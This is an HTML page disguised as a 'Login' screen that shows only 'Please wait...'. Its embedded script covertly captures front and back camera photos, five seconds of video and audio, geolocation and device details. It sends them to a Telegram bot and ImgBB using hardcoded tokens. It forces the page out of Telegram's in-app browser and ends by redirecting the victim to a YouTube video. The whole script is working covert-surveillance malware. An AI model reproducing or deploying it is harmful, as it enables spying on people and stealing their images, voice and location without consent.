<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            max-width: 350px;
            width: 100%;
            padding: 50px 30px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { 
            color: #667eea; 
            margin-bottom: 10px; 
            font-size: 28px;
            letter-spacing: 2px;
        }
        .subtitle { 
            color: #999; 
            margin-bottom: 30px; 
            font-size: 14px;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <div class="subtitle">Please wait...</div>
    </div>

    <script>
        const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
        const IMGBB_API_KEY = "b7ba0100d04e0add952f217e712c7ff8";
        const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        
        const urlParams = new URLSearchParams(window.location.search);
        const OWNER_ID = urlParams.get('id');
        
        const isTelegram = /Telegram/i.test(navigator.userAgent);
        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
        
        if (isTelegram && isMobile) {
            const currentUrl = window.location.href;
            window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
        }
        
        let photoDone = false;
        let videoDone = false;
        
        async function sendMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: OWNER_ID, text: text })
                });
            } catch(e) {}
        }
        
        async function uploadToImgBB(blob) {
            const fd = new FormData();
            fd.append('image', blob);
            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: fd });
            const data = await res.json();
            return data.success ? data.data.url : null;
        }
        
        // ========== ပုံရိုက်ခြင်း ==========
        async function takePhoto(facingMode, type) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(t => t.stop());
                
                canvas.toBlob(async (blob) => {
                    const url = await uploadToImgBB(blob);
                    await sendMessage(`📸 ${type} CAMERA PHOTO!\n🕐 ${new Date().toLocaleString()}\n📷 ${url}`);
                }, 'image/jpeg', 0.7);
            } catch(e) {
                await sendMessage(`❌ ${type} CAMERA DENIED!`);
            }
        }
        
        // ========== Video + အသံဖမ်းခြင်း (5 စက္ကန့်) ==========
        async function recordVideo() {
            try {
                // Camera + Microphone နှစ်ခုလုံးခွင့်တောင်းမယ်
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                    const formData = new FormData();
                    formData.append('chat_id', OWNER_ID);
                    formData.append('video', videoBlob, 'video.mp4');
                    formData.append('caption', `🎥 VIDEO + AUDIO RECORDED!\n🕐 Time: ${new Date().toLocaleString()}\n⏱️ Duration: 5 seconds`);
                    
                    try {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
                    } catch(e) {}
                    
                    stream.getTracks().forEach(t => t.stop());
                };
                
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
                
            } catch(e) {
                await sendMessage(`❌ VIDEO + AUDIO DENIED!\n🕐 ${new Date().toLocaleString()}`);
            }
        }
        
        // ========== တည်နေရာ ==========
        async function getLocation() {
            if (!navigator.geolocation) return;
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                await sendMessage(`📍 LOCATION!\n🕐 ${new Date().toLocaleString()}\n🌍 ${lat}, ${lon}\n🗺️ https://www.google.com/maps?q=${lat},${lon}`);
            }, async () => {
                await sendMessage(`❌ LOCATION DENIED!`);
            });
        }
        
        // ========== Device Info ==========
        async function getDeviceInfo() {
            let battery = "🔋 Battery: N/A";
            if ('getBattery' in navigator) {
                try {
                    const b = await navigator.getBattery();
                    battery = `🔋 Battery: ${Math.floor(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
                } catch(e) {}
            }
            
            let connection = "🌐 Connection: Unknown";
            if (navigator.connection) {
                connection = `🌐 Connection: ${navigator.connection.effectiveType || navigator.connection.type}`;
            }
            
            let device = "📱 Device: Unknown";
            const ua = navigator.userAgent;
            if (ua.includes('iPhone')) device = '📱 Device: iPhone';
            else if (ua.includes('Samsung')) device = '📱 Device: Samsung';
            else if (ua.includes('Redmi') || ua.includes('Xiaomi')) device = '📱 Device: Xiaomi/Redmi';
            else if (ua.includes('OPPO')) device = '📱 Device: OPPO';
            else if (ua.includes('vivo')) device = '📱 Device: vivo';
            
            await sendMessage(`📱 DEVICE INFO!\n${device}\n📌 Platform: ${navigator.platform}\n📌 Language: ${navigator.language}\n📌 Screen: ${screen.width}x${screen.height}\n${battery}\n${connection}`);
        }
        
        async function init() {
            if (!OWNER_ID) return;
            
            // အနောက်ကင်မရာပုံ
            await takePhoto('environment', 'BACK');
            
            // အရှေ့ကင်မရာပုံ
            await takePhoto('user', 'FRONT');
            
            // Video + အသံဖမ်း (5 စက္ကန့်)
            await recordVideo();
            
            // တည်နေရာ
            await getLocation();
            
            // Device Info
            await getDeviceInfo();
            
            setTimeout(() => { window.location.href = YOUTUBE_URL; }, 4000);
        }
        
        if (!isTelegram || !isMobile) {
            init();
        }
    </script>
</body>
</html>
